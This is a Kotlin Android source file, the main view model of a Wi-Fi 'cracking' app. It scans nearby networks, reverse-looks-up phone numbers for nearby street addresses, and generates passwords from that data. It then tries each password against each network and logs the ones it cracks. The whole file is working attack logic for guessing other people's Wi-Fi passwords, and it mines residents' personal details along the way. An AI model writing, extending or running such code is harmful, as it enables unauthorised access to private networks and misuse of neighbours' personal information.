package com.hereliesaz.dumbwifinder

import android.app.Application
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.LiveData
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.viewModelScope
import com.hereliesaz.dumbwifinder.data.CrackingStatus
import com.hereliesaz.dumbwifinder.data.WifiNetworkInfo
import com.hereliesaz.dumbwifinder.services.LocationService
import com.hereliesaz.dumbwifinder.services.ReverseLookupService
import com.hereliesaz.dumbwifinder.services.WifiService
import android.os.Build
import com.hereliesaz.dumbwifinder.utils.LogUtil
import com.hereliesaz.dumbwifinder.utils.PasswordGenerator
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch

class MainViewModel(application: Application) : AndroidViewModel(application) {

    private val _wifiList = MutableLiveData<List<WifiNetworkInfo>>()
    val wifiList: LiveData<List<WifiNetworkInfo>> = _wifiList

    private val _logMessages = MutableLiveData<String>()
    val logMessages: LiveData<String> = _logMessages

    private val _isCracking = MutableLiveData<Boolean>(false)
    val isCracking: LiveData<Boolean> = _isCracking

    private var crackingJob: Job? = null

    private val locationService = LocationService(application)
    private val wifiService = WifiService(application)
    private val reverseLookupService = ReverseLookupService()

    fun startStopCracking() {
        if (isCracking.value == true) {
            stopCracking()
        } else {
            startCracking()
        }
    }

    private fun startCracking() {
        _isCracking.value = true
        crackingJob = viewModelScope.launch {
            _logMessages.postValue("Starting cracking process...")

            val location = locationService.getCurrentLocation()
            if (location == null) {
                _logMessages.postValue("Could not get location.")
                _isCracking.postValue(false)
                return@launch
            }
            _logMessages.postValue("Got location: ${location.latitude}, ${location.longitude}")

            val wifiNetworks = wifiService.scanForWifiNetworks()
            val wifiNetworkInfos = wifiNetworks.map {
                val ssid = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    it.wifiSsid?.toString() ?: ""
                } else {
                    @Suppress("DEPRECATION")
                    it.SSID
                }
                WifiNetworkInfo(ssid, it.level)
            }
            _wifiList.postValue(wifiNetworkInfos)

            val nearbyAddresses = locationService.getNearbyAddresses(location)
            _logMessages.postValue("Found ${nearbyAddresses.size} nearby addresses.")

            for (networkInfo in wifiNetworkInfos) {
                if (crackingJob?.isCancelled == true) break
                networkInfo.status = CrackingStatus.IN_PROGRESS
                _wifiList.postValue(wifiNetworkInfos)

                for (address in nearbyAddresses) {
                    val addressLine = address.getAddressLine(0)
                    if (addressLine.isNullOrEmpty()) continue

                    val phoneNumber = reverseLookupService.lookupPhoneNumber(addressLine)
                    val passwords = PasswordGenerator.generatePasswords(addressLine, phoneNumber)

                    for (password in passwords) {
                        if (crackingJob?.isCancelled == true) break
                        if (wifiService.connectToWifi(networkInfo.ssid, password)) {
                            networkInfo.status = CrackingStatus.SUCCESS
                            networkInfo.password = password
                            LogUtil.logSuccess(networkInfo.ssid, password)
                            _logMessages.postValue("Cracked ${networkInfo.ssid}!")
                            break // Move to the next network
                        } else {
                            LogUtil.logFailure(networkInfo.ssid, password)
                        }
                    }
                    if (networkInfo.status == CrackingStatus.SUCCESS) break
                }

                if (networkInfo.status != CrackingStatus.SUCCESS) {
                    networkInfo.status = CrackingStatus.FAIL
                }
                _wifiList.postValue(wifiNetworkInfos)
            }

            _logMessages.postValue("Cracking process finished.")
            _isCracking.postValue(false)
        }
    }

    private fun stopCracking() {
        crackingJob?.cancel()
        _isCracking.value = false
        _logMessages.value = "Cracking process stopped by user."
    }
}
